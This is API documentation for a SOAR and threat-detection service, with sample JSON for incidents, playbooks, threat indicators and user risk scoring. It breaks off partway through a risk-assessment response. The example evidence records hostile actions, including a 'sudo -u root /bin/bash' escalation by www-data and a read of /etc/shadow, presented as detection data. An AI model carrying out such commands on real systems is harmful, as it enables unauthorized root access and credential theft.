# SOAR & Threat Detection API Documentation

## Overview

The SOAR (Security Orchestration, Automation, and Response) and Threat Detection API provides comprehensive security incident management, automated response workflows, threat intelligence, and behavioral analysis capabilities.

**Base URL**: `https://api.rust-security.com/soar` (production) | `http://localhost:8003` (development)

## Table of Contents

1. [Incident Management](#incident-management)
2. [Playbook Automation](#playbook-automation)
3. [Threat Intelligence](#threat-intelligence)
4. [Behavioral Analysis](#behavioral-analysis)
5. [AI-Powered Threat Detection](#ai-powered-threat-detection)
6. [Webhook Events](#webhook-events)

---

## Incident Management

### POST /api/v1/incidents

**Create a new security incident**

```http
POST /api/v1/incidents
Content-Type: application/json
Authorization: Bearer <token>

{
  "title": "Advanced Persistent Threat Detection",
  "description": "Sophisticated attack pattern detected across multiple systems",
  "severity": "critical",
  "category": "apt_detection", 
  "priority": "P1",
  "source": "ml_detection_engine",
  "affected_assets": [
    {
      "type": "server",
      "identifier": "prod-web-01.example.com",
      "criticality": "critical",
      "ip_address": "10.0.1.15",
      "asset_tags": ["production", "web-server", "public-facing"]
    },
    {
      "type": "database",
      "identifier": "prod-db-cluster-01",
      "criticality": "critical",
      "ip_address": "10.0.2.10",
      "asset_tags": ["production", "database", "customer-data"]
    },
    {
      "type": "user_account",
      "identifier": "admin@example.com",
      "criticality": "high",
      "last_activity": "2025-01-28T15:30:00Z"
    }
  ],
  "evidence": [
    {
      "type": "network_traffic",
      "timestamp": "2025-01-28T15:25:00Z",
      "source": "network_monitor",
      "data": {
        "source_ip": "203.0.113.45",
        "destination_ip": "10.0.1.15",
        "protocol": "TCP",
        "destination_port": 443,
        "bytes_transferred": 1048576,
        "duration_seconds": 300,
        "unusual_patterns": [
          "data_exfiltration_signature",
          "encrypted_tunnel_detected"
        ]
      }
    },
    {
      "type": "log_analysis",
      "timestamp": "2025-01-28T15:28:00Z", 
      "source": "siem_system",
      "data": {
        "log_source": "/var/log/auth.log",
        "events_count": 47,
        "suspicious_events": [
          {
            "timestamp": "2025-01-28T15:26:15Z",
            "event": "privilege_escalation_attempt",
            "user": "www-data",
            "command": "sudo -u root /bin/bash",
            "success": true
          },
          {
            "timestamp": "2025-01-28T15:27:22Z",
            "event": "sensitive_file_access",
            "file": "/etc/shadow",
            "operation": "read",
            "user": "root"
          }
        ]
      }
    },
    {
      "type": "file_integrity",
      "timestamp": "2025-01-28T15:29:00Z",
      "source": "file_integrity_monitor",
      "data": {
        "modified_files": [
          {
            "path": "/usr/bin/systemctl",
            "original_hash": "sha256:abc123...",
            "new_hash": "sha256:def456...",
            "modification_time": "2025-01-28T15:26:45Z"
          }
        ],
        "new_files": [
          {
            "path": "/tmp/.hidden_backdoor",
            "hash": "sha256:malware789...",
            "creation_time": "2025-01-28T15:27:10Z",
            "permissions": "755"
          }
        ]
      }
    }
  ],
  "context": {
    "detection_method": "ai_correlation_engine",
    "confidence_score": 0.95,
    "risk_score": 95,
    "attack_vector": "web_application_compromise",
    "threat_actor_profile": {
      "sophistication_level": "advanced",
      "likely_motivation": "data_theft",
      "similar_campaigns": ["APT29_2024_campaign", "Lazarus_group_tactics"]
    },
    "timeline": {
      "initial_compromise": "2025-01-28T14:45:00Z",
      "privilege_escalation": "2025-01-28T15:26:15Z", 
      "data_access": "2025-01-28T15:27:22Z",
      "detection": "2025-01-28T15:29:30Z"
    },
    "tags": ["apt", "data_breach", "privilege_escalation", "backdoor", "critical_infrastructure"],
    "custom_fields": {
      "compliance_impact": ["SOX", "PCI-DSS", "GDPR"],
      "estimated_damage": "high",
      "customer_impact": "potential_data_exposure",
      "regulatory_notification_required": true
    }
  },
  "auto_assign": true,
  "escalation_rules": [
    {
      "condition": "severity == 'critical' AND elapsed_time > 30min",
      "action": "escalate_to_ciso",
      "enabled": true
    }
  ]
}
```

**Response (201):**
```json
{
  "incident": {
    "incident_id": "inc_2N4d7Hx9Kp1mQ8fR",
    "title": "Advanced Persistent Threat Detection",
    "description": "Sophisticated attack pattern detected across multiple systems",
    "severity": "critical",
    "category": "apt_detection",
    "status": "open",
    "priority": "P1",
    "created_at": "2025-01-28T16:00:00Z",
    "updated_at": "2025-01-28T16:00:00Z",
    "created_by": "system:ml_detection_engine",
    "assigned_to": "security_team_lead@example.com",
    "sla": {
      "response_time_minutes": 15,
      "resolution_time_hours": 4,
      "first_response_due": "2025-01-28T16:15:00Z",
      "resolution_due": "2025-01-28T20:00:00Z"
    },
    "workflow_status": {
      "current_step": "containment_assessment",
      "workflow_id": "wf_critical_incident_response",
      "automated_actions_initiated": [
        {
          "action": "isolate_affected_systems",
          "status": "in_progress",
          "initiated_at": "2025-01-28T16:00:10Z",
          "estimated_completion": "2025-01-28T16:05:00Z"
        },
        {
          "action": "block_malicious_ips",
          "status": "completed",
          "completed_at": "2025-01-28T16:00:30Z",
          "result": "blocked_3_ip_addresses"
        },
        {
          "action": "preserve_forensic_evidence",
          "status": "initiated",
          "initiated_at": "2025-01-28T16:01:00Z"
        }
      ]
    },
    "metrics": {
      "time_to_detection": 2670, // seconds from initial compromise
      "mean_time_to_containment": null, // will be populated when containment is complete
      "affected_systems_count": 2,
      "affected_users_count": 1,
      "evidence_artifacts": 15
    }
  }
}
```

### GET /api/v1/incidents/{incidentId}

**Get detailed incident information**

```http
GET /api/v1/incidents/inc_2N4d7Hx9Kp1mQ8fR
Authorization: Bearer <token>
```

**Response (200):**
```json
{
  "incident": {
    "incident_id": "inc_2N4d7Hx9Kp1mQ8fR",
    "title": "Advanced Persistent Threat Detection",
    "description": "Sophisticated attack pattern detected across multiple systems",
    "severity": "critical",
    "category": "apt_detection",
    "status": "in_progress",
    "priority": "P1",
    "created_at": "2025-01-28T16:00:00Z",
    "updated_at": "2025-01-28T16:30:00Z",
    "created_by": "system:ml_detection_engine",
    "assigned_to": "security_team_lead@example.com",
    "assigned_team": "incident_response_team_alpha",
    
    "timeline": [
      {
        "timestamp": "2025-01-28T16:00:00Z",
        "event": "incident_created",
        "user": "system:ml_detection_engine",
        "details": "Incident created by AI threat detection"
      },
      {
        "timestamp": "2025-01-28T16:00:10Z",
        "event": "automatic_containment_initiated",
        "user": "system:soar_engine",
        "details": "Automated containment playbook started"
      },
      {
        "timestamp": "2025-01-28T16:05:00Z",
        "event": "systems_isolated",
        "user": "system:soar_engine", 
        "details": "Affected systems isolated from network"
      },
      {
        "timestamp": "2025-01-28T16:15:00Z",
        "event": "first_responder_assigned",
        "user": "security_team_lead@example.com",
        "details": "Senior analyst assigned for investigation"
      },
      {
        "timestamp": "2025-01-28T16:25:00Z",
        "event": "forensic_analysis_started",
        "user": "forensic_analyst@example.com",
        "details": "Deep forensic analysis of affected systems initiated"
      }
    ],
    
    "affected_assets": [
      {
        "type": "server",
        "identifier": "prod-web-01.example.com",
        "criticality": "critical",
        "status": "isolated",
        "containment_actions": [
          "network_isolation",
          "process_dump_captured",
          "memory_image_acquired"
        ],
        "analysis_results": {
          "malware_detected": true,
          "data_compromised": "investigating",
          "backdoor_present": true
        }
      }
    ],
    
    "investigation_findings": [
      {
        "finding_id": "f_2N4d7Hx9Kp1mQ8fR_001",
        "type": "malware_analysis",
        "severity": "critical",
        "title": "Custom Backdoor Detected",
        "description": "Sophisticated backdoor with rootkit capabilities installed",
        "details": {
          "file_path": "/tmp/.hidden_backdoor",
          "file_hash": "sha256:malware789...",
          "capabilities": [
            "remote_access",
            "keylogging", 
            "screen_capture",
            "file_exfiltration",
            "command_execution"
          ],
          "c2_servers": [
            "203.0.113.45:443",
            "198.51.100.22:8080"
          ],
          "encryption": "AES-256",
          "persistence_mechanisms": [
            "systemd_service",
            "cron_job",
            "library_injection"
          ]
        },
        "analyst": "malware_analyst@example.com",
        "created_at": "2025-01-28T16:20:00Z"
      },
      {
        "finding_id": "f_2N4d7Hx9Kp1mQ8fR_002", 
        "type": "data_analysis",
        "severity": "high",
        "title": "Sensitive Data Access Detected",
        "description": "Evidence of access to customer database and financial records",
        "details": {
          "databases_accessed": [
            "customer_data",
            "financial_records", 
            "employee_information"
          ],
          "records_potentially_compromised": 15750,
          "data_types": [
            "PII",
            "financial_data",
            "authentication_credentials"
          ],
          "export_activity": {
            "detected": true,
            "export_time": "2025-01-28T15:27:45Z",
            "file_size_mb": 125,
            "destination": "external_server"
          }
        },
        "analyst": "data_forensics@example.com",
        "created_at": "2025-01-28T16:35:00Z"
      }
    ],
    
    "containment_status": {
      "phase": "complete",
      "actions_taken": [
        "network_segmentation_applied",
        "affected_systems_isolated",
        "malicious_ips_blocked",
        "compromised_accounts_disabled",
        "backup_systems_activated"
      ],
      "systems_quarantined": 2,
      "network_traffic_blocked": "malicious_c2_communications",
      "user_access_revoked": ["admin@example.com"],
      "estimated_spread_contained": true
    },
    
    "eradication_plan": {
      "status": "in_progress",
      "steps": [
        {
          "step": "malware_removal",
          "status": "completed",
          "tools_used": ["custom_removal_script", "antivirus_scan"],
          "completed_at": "2025-01-28T17:00:00Z"
        },
        {
          "step": "system_rebuilds",
          "status": "in_progress", 
          "affected_systems": ["prod-web-01.example.com"],
          "estimated_completion": "2025-01-28T20:00:00Z"
        },
        {
          "step": "vulnerability_patching",
          "status": "scheduled",
          "vulnerabilities_identified": [
            "CVE-2024-12345",
            "CVE-2024-67890"
          ]
        }
      ]
    },
    
    "recovery_plan": {
      "status": "planned",
      "recovery_point_objective": "2 hours",
      "recovery_time_objective": "4 hours", 
      "backup_strategy": "restore_from_clean_backup",
      "validation_tests": [
        "system_functionality",
        "security_controls",
        "performance_baseline",
        "data_integrity"
      ]
    },
    
    "lessons_learned": {
      "root_cause": "unpatched_web_application_vulnerability",
      "attack_vector": "SQL_injection_leading_to_RCE",
      "prevention_measures": [
        "implement_web_application_firewall",
        "improve_patch_management_process",
        "enhanced_monitoring_for_privilege_escalation",
        "mandatory_code_reviews_for_web_applications"
      ],
      "response_improvements": [
        "faster_automated_isolation",
        "better_forensic_data_collection",
        "improved_stakeholder_communication"
      ]
    }
  }
}
```

### PUT /api/v1/incidents/{incidentId}/status

**Update incident status with detailed notes**

```http
PUT /api/v1/incidents/inc_2N4d7Hx9Kp1mQ8fR/status
Content-Type: application/json
Authorization: Bearer <token>

{
  "status": "resolved",
  "resolution_summary": "Advanced persistent threat successfully contained and eradicated",
  "resolution_details": {
    "containment_completed_at": "2025-01-28T17:30:00Z",
    "eradication_completed_at": "2025-01-28T19:45:00Z", 
    "recovery_completed_at": "2025-01-28T21:15:00Z",
    "systems_restored": [
      {
        "system": "prod-web-01.example.com",
        "restoration_method": "full_rebuild_from_backup",
        "validation_tests_passed": true,
        "restored_at": "2025-01-28T20:30:00Z"
      }
    ],
    "vulnerabilities_patched": [
      "CVE-2024-12345",
      "CVE-2024-67890"
    ],
    "security_improvements": [
      "WAF rules updated",
      "Enhanced monitoring deployed",
      "Access controls strengthened"
    ]
  },
  "impact_assessment": {
    "data_breach": {
      "confirmed": true,
      "records_affected": 15750,
      "data_types": ["PII", "financial_data"],
      "notification_requirements": [
        {
          "authority": "regulatory_body",
          "deadline": "2025-01-30T16:00:00Z",
          "status": "notified"
        },
        {
          "authority": "customers",
          "deadline": "2025-01-31T16:00:00Z", 
          "status": "in_progress"
        }
      ]
    },
    "business_impact": {
      "service_downtime": "2.5 hours",
      "estimated_financial_loss": "$250000",
      "reputation_impact": "medium",
      "customer_impact": "high"
    }
  },
  "post_incident_actions": [
    {
      "action": "security_architecture_review",
      "owner": "ciso@example.com",
      "due_date": "2025-02-15T00:00:00Z",
      "priority": "high"
    },
    {
      "action": "incident_response_process_improvement",
      "owner": "security_team_lead@example.com", 
      "due_date": "2025-02-28T00:00:00Z",
      "priority": "medium"
    }
  ],
  "closed_by": "security_team_lead@example.com",
  "closure_notes": "Comprehensive investigation completed. All systems restored and secured. Lessons learned documented and improvement actions assigned."
}
```

---

## Playbook Automation

### POST /api/v1/playbooks/{playbookId}/execute

**Execute security response playbook with advanced parameters**

```http
POST /api/v1/playbooks/pb_apt_response_comprehensive/execute
Content-Type: application/json
Authorization: Bearer <token>

{
  "incident_id": "inc_2N4d7Hx9Kp1mQ8fR",
  "execution_mode": "supervised",
  "parameters": {
    "affected_systems": [
      "prod-web-01.example.com",
      "prod-db-cluster-01"
    ],
    "threat_level": "critical",
    "containment_strategy": "aggressive",
    "preserve_forensics": true,
    "business_hours": false,
    "stakeholder_notifications": {
      "ciso": true,
      "legal_team": true,
      "pr_team": true,
      "customers": false
    },
    "regulatory_compliance": {
      "gdpr_applicable": true,
      "sox_applicable": true,
      "notification_timeline_hours": 72
    },
    "custom_actions": {
      "activate_backup_datacenter": true,
      "engage_external_forensics": true,
      "coordinate_with_law_enforcement": false
    }
  },
  "approvals": {
    "required_for_destructive_actions": true,
    "auto_approve_containment": true,
    "approval_timeout_minutes": 30,
    "escalation_chain": [
      "security_team_lead@example.com",
      "ciso@example.com", 
      "ceo@example.com"
    ]
  },
  "monitoring": {
    "progress_webhooks": [
      "https://internal-tools.example.com/incident-updates"
    ],
    "step_completion_notifications": true,
    "error_escalation": true
  }
}
```

**Response (202):**
```json
{
  "execution": {
    "execution_id": "exec_8Kx2Nv5mP9qR4tY7",
    "playbook_id": "pb_apt_response_comprehensive",
    "playbook_name": "Advanced Persistent Threat Comprehensive Response",
    "incident_id": "inc_2N4d7Hx9Kp1mQ8fR",
    "status": "running",
    "execution_mode": "supervised",
    "started_at": "2025-01-28T16:45:00Z",
    "estimated_completion": "2025-01-28T18:30:00Z",
    
    "current_step": {
      "step_number": 3,
      "step_name": "Threat Intelligence Enrichment", 
      "step_type": "data_collection",
      "status": "running",
      "started_at": "2025-01-28T16:47:30Z",
      "estimated_duration": "3 minutes",
      "description": "Gathering threat intelligence on IOCs and attack patterns",
      "progress_percentage": 65
    },
    
    "completed_steps": [
      {
        "step_number": 1,
        "step_name": "Initial Assessment and Classification",
        "status": "completed",
        "started_at": "2025-01-28T16:45:00Z",
        "completed_at": "2025-01-28T16:45:45Z",
        "duration_seconds": 45,
        "result": "success",
        "output": {
          "threat_classification": "APT",
          "severity_confirmed": "critical",
          "attack_vector": "web_application_compromise",
          "initial_compromise_time": "2025-01-28T14:45:00Z"
        },
        "artifacts_generated": [
          {
            "type": "assessment_report",
            "url": "/api/v1/artifacts/assessment_2N4d7Hx9Kp1mQ8fR.pdf"
          }
        ]
      },
      {
        "step_number": 2,
        "step_name": "Emergency Containment",
        "status": "completed", 
        "started_at": "2025-01-28T16:45:45Z",
        "completed_at": "2025-01-28T16:47:15Z",
        "duration_seconds": 90,
        "result": "success",
        "output": {
          "systems_isolated": ["prod-web-01.example.com"],
          "network_segments_blocked": ["10.0.1.0/24"],
          "malicious_ips_blocked": ["203.0.113.45", "198.51.100.22"],
          "user_accounts_disabled": ["admin@example.com"],
          "containment_effectiveness": "95%"
        },
        "approval_required": false,
        "human_intervention": false
      }
    ],
    
    "pending_steps": [
      {
        "step_number": 4,
        "step_name": "Forensic Evidence Collection",
        "step_type": "investigation",
        "estimated_start": "2025-01-28T16:50:30Z",
        "estimated_duration": "15 minutes",
        "requires_approval": false,
        "dependencies": ["step_3_completion"]
      },
      {
        "step_number": 5,
        "step_name": "Malware Analysis",
        "step_type": "analysis",
        "estimated_start": "2025-01-28T17:05:30Z", 
        "estimated_duration": "30 minutes",
        "requires_approval": false,
        "automated": false,
        "assigned_analyst": "malware_analyst@example.com"
      },
      {
        "step_number": 6,
        "step_name": "System Eradication",
        "step_type": "remediation",
        "estimated_start": "2025-01-28T17:35:30Z",
        "estimated_duration": "45 minutes", 
        "requires_approval": true,
        "destructive": true,
        "approval_reason": "System rebuild required - data loss possible"
      }
    ],
    
    "execution_metrics": {
      "total_steps": 12,
      "completed_steps": 2,
      "failed_steps": 0,
      "steps_requiring_approval": 3,
      "manual_interventions": 0,
      "estimated_time_savings": "4 hours compared to manual response"
    },
    
    "resource_allocation": {
      "analysts_assigned": 3,
      "systems_reserved": ["forensic-analysis-01", "malware-sandbox-02"],
      "external_resources": ["threat_intel_feed", "forensic_cloud_instance"]
    }
  }
}
```

### GET /api/v1/playbooks

**List available playbooks with advanced filtering**

```http
GET /api/v1/playbooks?category=incident_response&severity=critical&tags=apt,malware&automation_level=supervised
Authorization: Bearer <token>
```

**Response (200):**
```json
{
  "playbooks": [
    {
      "playbook_id": "pb_apt_response_comprehensive", 
      "name": "Advanced Persistent Threat Comprehensive Response",
      "description": "Full-scale response to sophisticated APT attacks including containment, investigation, eradication, and recovery",
      "category": "incident_response",
      "severity_levels": ["critical", "high"],
      "automation_level": "supervised",
      "tags": ["apt", "malware", "data_breach", "forensics"],
      "created_by": "security_architect@example.com",
      "created_at": "2024-12-15T10:00:00Z",
      "last_updated": "2025-01-15T14:30:00Z",
      "version": "2.1",
      
      "execution_stats": {
        "total_executions": 23,
        "successful_executions": 21,
        "average_duration_minutes": 105,
        "success_rate": 0.913,
        "last_execution": "2025-01-25T09:15:00Z"
      },
      
      "steps_summary": {
        "total_steps": 12,
        "automated_steps": 8,
        "manual_steps": 4,
        "approval_required_steps": 3,
        "estimated_duration": "90-120 minutes"
      },
      
      "trigger_conditions": [
        "incident_severity == 'critical'",
        "incident_category in ['apt_detection', 'advanced_malware']",
        "affected_systems_count > 1"
      ],
      
      "required_permissions": [
        "incident:manage",
        "playbook:execute", 
        "system:isolate",
        "forensics:collect"
      ],
      
      "integration_points": [
        "SIEM_platform",
        "EDR_solutions", 
        "threat_intelligence_feeds",
        "forensic_tools",
        "backup_systems"
      ]
    },
    {
      "playbook_id": "pb_ransomware_response_rapid",
      "name": "Ransomware Rapid Response",
      "description": "Fast-track response for ransomware incidents focusing on immediate containment and recovery",
      "category": "incident_response",
      "severity_levels": ["critical"],
      "automation_level": "automated",
      "tags": ["ransomware", "malware", "containment", "recovery"],
      "created_by": "incident_response_team@example.com",
      "created_at": "2024-11-20T15:30:00Z",
      "last_updated": "2025-01-20T11:45:00Z", 
      "version": "3.2",
      
      "execution_stats": {
        "total_executions": 45,
        "successful_executions": 43,
        "average_duration_minutes": 35,
        "success_rate": 0.956,
        "last_execution": "2025-01-27T13:22:00Z"
      },
      
      "steps_summary": {
        "total_steps": 8,
        "automated_steps": 7,
        "manual_steps": 1,
        "approval_required_steps": 1,
        "estimated_duration": "30-45 minutes"
      }
    }
  ],
  "pagination": {
    "page": 1,
    "per_page": 20,
    "total": 2,
    "total_pages": 1
  },
  "categories": [
    {
      "category": "incident_response",
      "count": 15
    },
    {
      "category": "threat_hunting", 
      "count": 8
    },
    {
      "category": "vulnerability_response",
      "count": 12
    }
  ]
}
```

---

## Threat Intelligence

### GET /api/v1/threat-intelligence/indicators

**Advanced threat indicator search with context**

```http
GET /api/v1/threat-intelligence/indicators?
  types=ip,domain,hash&
  confidence=high,medium&
  threat_types=apt,ransomware&
  active=true&
  first_seen_after=2025-01-01T00:00:00Z&
  tags=financial_sector&
  include_context=true&
  include_relationships=true&
  page=1&limit=50
Authorization: Bearer <token>
```

**Response (200):**
```json
{
  "indicators": [
    {
      "indicator_id": "ind_2N4d7Hx9Kp1mQ8fR",
      "type": "ip_address",
      "value": "203.0.113.45",
      "confidence": "high",
      "threat_types": ["apt", "c2_server", "data_exfiltration"],
      "severity": "critical", 
      "first_seen": "2025-01-20T08:30:00Z",
      "last_seen": "2025-01-28T16:45:00Z",
      "status": "active",
      
      "sources": [
        {
          "source_id": "src_threat_feed_premium",
          "name": "Premium Threat Intelligence Feed",
          "reputation_score": 98,
          "last_updated": "2025-01-28T16:00:00Z",
          "confidence_score": 0.95,
          "source_type": "commercial_feed"
        },
        {
          "source_id": "src_internal_honeypot",
          "name": "Internal Honeypot Network",
          "reputation_score": 100,
          "last_updated": "2025-01-28T16:45:00Z",
          "confidence_score": 1.0,
          "source_type": "internal_collection"
        },
        {
          "source_id": "src_community_sharing",
          "name": "Financial Sector Threat Sharing",
          "reputation_score": 85,
          "last_updated": "2025-01-28T14:30:00Z", 
          "confidence_score": 0.85,
          "source_type": "community_intelligence"
        }
      ],
      
      "context": {
        "geolocation": {
          "country": "Unknown",
          "country_code": null,
          "region": null,
          "city": null,
          "latitude": null,
          "longitude": null,
          "asn": "AS64512",
          "asn_organization": "Suspicious Hosting Services Ltd",
          "is_tor_exit_node": false,
          "is_vpn_endpoint": true,
          "hosting_type": "bulletproof_hosting"
        },
        
        "network_analysis": {
          "open_ports": [22, 443, 8080, 9001],
          "services_detected": [
            {
              "port": 443,
              "service": "HTTPS",
              "version": "nginx/1.18.0",
              "ssl_certificate": {
                "subject": "*.malicious-domain.com",
                "issuer": "Self-signed",
                "valid_from": "2025-01-15T00:00:00Z",
                "valid_until": "2026-01-15T00:00:00Z",
                "suspicious": true
              }
            }
          ],
          "dns_history": [
            {
              "domain": "malicious-c2.example",
              "first_seen": "2025-01-20T00:00:00Z", 
              "last_seen": "2025-01-28T16:45:00Z"
            }
          ]
        },
        
        "attack_patterns": [
          {
            "mitre_id": "T1071.001",
            "technique": "Application Layer Protocol: Web Protocols",
            "tactic": "Command and Control",
            "confidence": 0.92
          },
          {
            "mitre_id": "T1041",
            "technique": "Exfiltration Over C2 Channel", 
            "tactic": "Exfiltration",
            "confidence": 0.88
          }
        ],
        
        "threat_actor_attribution": {
          "likely_actors": [
            {
              "actor_name": "APT29 (Cozy Bear)",
              "confidence": 0.75,
              "reasoning": "TTPs match known APT29 campaigns",
              "similar_campaigns": [
                "SolarWinds Supply Chain Attack",
                "Microsoft Exchange Server Attacks 2021"
              ]
            }
          ],
          "motivation": ["espionage", "financial_gain"],
          "sophistication": "advanced",
          "resource_level": "state_sponsored"
        },
        
        "victimology": {
          "targeted_sectors": ["financial_services", "government", "healthcare"],
          "targeted_countries": ["US", "UK", "DE", "FR"],
          "victim_profile": "high_value_targets",
          "attack_methods": ["spear_phishing", "watering_hole", "supply_chain"]
        }
      },
      
      "relationships": [
        {
          "related_indicator_id": "ind_8Kx2Nv5mP9qR4tY7",
          "relationship_type": "communicates_with",
          "related_value": "198.51.100.22", 
          "relationship_confidence": 0.85,
          "first_observed": "2025-01-22T14:20:00Z",
          "description": "Observed in coordinated C2 communications"
        },
        {
          "related_indicator_id": "ind_3Yt9Bx6nM2pQ5sF8",
          "relationship_type": "hosts_malware",
          "related_value": "sha256:malware789abc...",
          "relationship_confidence": 0.95,
          "first_observed": "2025-01-20T10:15:00Z",
          "description": "Hosts custom backdoor payload"
        }
      ],
      
      "actions_taken": [
        {
          "action": "blocked_at_perimeter_firewall",
          "timestamp": "2025-01-28T16:45:30Z",
          "duration": "indefinite",
          "system": "primary_firewall_cluster",
          "effectiveness": "100%_blocked"
        },
        {
          "action": "dns_sinkholed",
          "timestamp": "2025-01-28T16:46:00Z",
          "sinkhole_ip": "192.0.2.1",
          "queries_redirected": 1247
        },
        {
          "action": "shared_with_partners",
          "timestamp": "2025-01-28T17:00:00Z",
          "partners": ["financial_sector_isac", "national_cert"],
          "sharing_level": "amber_strict"
        }
      ],
      
      "tags": ["apt29", "cozy_bear", "financial_sector", "c2_server", "high_priority"],
      "custom_attributes": {
        "internal_case_id": "CASE-2025-0128-001", 
        "analyst_notes": "High-confidence APT infrastructure - immediate blocking recommended",
        "business_impact": "critical",
        "regulatory_implications": ["pci_dss", "sox_compliance"]
      },
      
      "expires_at": "2025-07-28T00:00:00Z",
      "created_at": "2025-01-20T08:30:00Z",
      "updated_at": "2025-01-28T16:45:00Z"
    }
  ],
  
  "query_metadata": {
    "total_indicators": 1,
    "query_time_ms": 245,
    "data_sources_queried": 12,
    "cache_hit_ratio": 0.75,
    "threat_score_distribution": {
      "critical": 1,
      "high": 0,
      "medium": 0, 
      "low": 0
    }
  },
  
  "enrichment_data": {
    "related_campaigns": [
      {
        "campaign_name": "Operation Ghost Writer",
        "first_seen": "2024-12-01T00:00:00Z",
        "threat_actors": ["APT29"],
        "indicators_overlap": 15
      }
    ],
    "trending_threats": [
      {
        "threat_type": "apt",
        "growth_rate": 0.25,
        "time_period": "last_30_days"
      }
    ]
  }
}
```

### POST /api/v1/threat-intelligence/indicators/bulk-enrich

**Bulk enrichment of indicators with threat intelligence**

```http
POST /api/v1/threat-intelligence/indicators/bulk-enrich
Content-Type: application/json
Authorization: Bearer <token>

{
  "indicators": [
    {
      "type": "ip",
      "value": "203.0.113.45"
    },
    {
      "type": "domain", 
      "value": "suspicious-domain.com"
    },
    {
      "type": "hash",
      "value": "sha256:d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4"
    },
    {
      "type": "email",
      "value": "attacker@malicious-domain.com"
    }
  ],
  "enrichment_options": {
    "include_geolocation": true,
    "include_passive_dns": true,
    "include_malware_analysis": true,
    "include_attribution": true,
    "include_relationships": true,
    "threat_feeds": ["premium", "community", "internal"],
    "historical_analysis_days": 90
  },
  "output_format": "detailed",
  "priority": "high"
}
```

**Response (202):**
```json
{
  "enrichment_job": {
    "job_id": "job_enrich_2N4d7Hx9Kp1mQ8fR",
    "status": "processing",
    "indicators_submitted": 4,
    "estimated_completion": "2025-01-28T17:05:00Z",
    "progress": {
      "completed": 1,
      "processing": 2,
      "queued": 1,
      "failed": 0
    },
    "webhook_url": "https://your-app.com/webhooks/enrichment-complete"
  }
}
```

---

## Behavioral Analysis

### GET /api/v1/behavioral-analysis/users/{userId}/risk-assessment

**Comprehensive user risk assessment**

```http
GET /api/v1/behavioral-analysis/users/usr_2N4d7Hx9Kp1mQ8fR/risk-assessment?
  include_historical=true&
  analysis_depth=comprehensive&
  time_window_days=30
Authorization: Bearer <token>
```

**Response (200):**
```json
{
  "risk_assessment": {
    "user_id": "usr_2N4d7Hx9Kp1mQ8fR",
    "assessment_timestamp": "2025-01-28T17:00:00Z",
    "overall_risk_score": 75,
    "risk_level": "high",
    "confidence_score": 0.89,
    "assessment_period": {
      "start_date": "2024-12-29T17:00:00Z",
      "end_date": "2025-01-28T17:00:00Z",
      "data_points_analyzed": 2456
    },
    
    "behavioral_baseline": {
      "established_date": "2024-06-15T00:00:00Z",
      "baseline_confidence": 0.94,
      "learning_period_days": 90,
      "baseline_refresh_date": "2024-12-15T00:00:00Z",
      "data_quality_score": 0.92,
      
      "typical_patterns": {
        "login_times": {
          "weekday_hours": [8, 9, 10, 11, 12, 13, 14, 15, 16, 17],
          "weekend_activity": "minimal",
          "timezone_consistency": "America/New_York",
          "time_variance_minutes": 45
        },
        
        "location_patterns": {
          "primary_locations": [
            {
              "city": "New York",
              "country": "US", 
              "frequency": 0.85,
              "ip_ranges": ["192.168.1.0/24", "10.0.0.0/8"]
            },
            {
              "city": "Boston",
              "country": "US",
              "frequency": 0.12,
              "ip_ranges": ["172.16.0.0/12"]
            }
          ],
          "travel_frequency": "low",
          "geographic_radius_km": 500
        },
        
        "device_patterns": {
          "primary_devices": [
            {
              "device_fingerprint": "dev_Abc123Def456",
              "device_type": "desktop",
              "os": "macOS 14.2",
              "browser": "Chrome 120.0.0",
              "frequency": 0.78,
              "trusted": true
            },
            {
              "device_fingerprint": "dev_mobile_789xyz",
              "device_type": "mobile",
              "os": "iOS 17.2",
              "browser": "Safari Mobile",
              "frequency": 0.20,
              "trusted": true
            }
          ],
          "device_consistency": "high",
          "new_device_frequency": "rare"
        },
        
        "activity_patterns": {
          "session_duration": {
            "average_minutes": 125,
            "median_minutes": 95,
            "typical_range": "60-180 minutes"
          },
          "actions_per_session": {
            "average": 28,
            "median": 22,
            "typical_range": "15-45 actions"
          },
          "feature_usage": {
            "most_used": ["dashboard", "reports", "user_management"],
            "rarely_used": ["admin_settings", "system_logs"],
            "usage_consistency": "high"
          },
          "data_access_patterns": {
            "typical_data_volume_mb": 15.5,
            "sensitive_data_frequency": 0.12,
            "export_frequency": "weekly"
          }
        }
      }
    },
    
    "current_anomalies": [
      {
        "anomaly_id": "anom_2N4d7Hx9Kp1mQ8fR_001",
        "type": "impossible_travel",
        "severity": "critical",
        "detected_at": "2025-01-28T02:30:00Z",
        "description": "Login from Romania while previous login was from New York 2 hours earlier",
        "risk_contribution": 35,
        "details": {
          "previous_location": {
            "city": "New York",
            "country": "US", 
            "timestamp": "2025-01-28T00:15:00Z",
            "ip": "192.168.1.100"
          },
          "current_location": {
            "city": "Bucharest",
            "country": "RO",
            "timestamp": "2025-01-28T02:30:00Z",
            "ip": "203.0.113.45"
          },
          "required_travel_speed_kmh": 3250,
          "maximum_possible_speed_kmh": 900,
          "impossibility_factor": 3.6
        }
      },
      {
        "anomaly_id": "anom_2N4d7Hx9Kp1mQ8fR_002",
        "type": "suspicious_user_agent",
        "severity": "high", 
        "detected_at": "2025-01-28T02:30:00Z",
        "description": "Login using command-line tool instead of typical browser",
        "risk_contribution": 25,
        "details": {
          "observed_user_agent": "curl/7.68.0",
          "typical_user_agents": [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1"
          ],
          "automation_indicators": ["command_line_tool", "non_interactive"]
        }
      },
      {
        "anomaly_id": "anom_2N4d7Hx9Kp1mQ8fR_003",
        "type": "unusual_data_access",
        "severity": "medium",
        "detected_at": "2025-01-28T02:35:00Z",
        "description": "Access to sensitive customer data outside normal business hours",
        "risk_contribution": 15,
        "details": {
          "data_accessed": "customer_financial_records",
          "access_time": "02:35 UTC",
          "typical_access_hours": "13:00-22:00 UTC",
          "data_sensitivity": "high",
          "records_accessed": 1247,
          "download_attempted": true
        }
      }
    ],
    
    "risk_factors": [
      {
        "factor": "geographic_anomaly",
        "weight": 0.4,
        "score": 95,
        "description": "Login from high-risk geographic location"
      },
      {
        "factor": "temporal_anomaly", 
        "weight": 0.2,
        "score": 80,
        "description": "Activity during unusual hours"
      },
      {
        "factor": "behavioral_deviation",
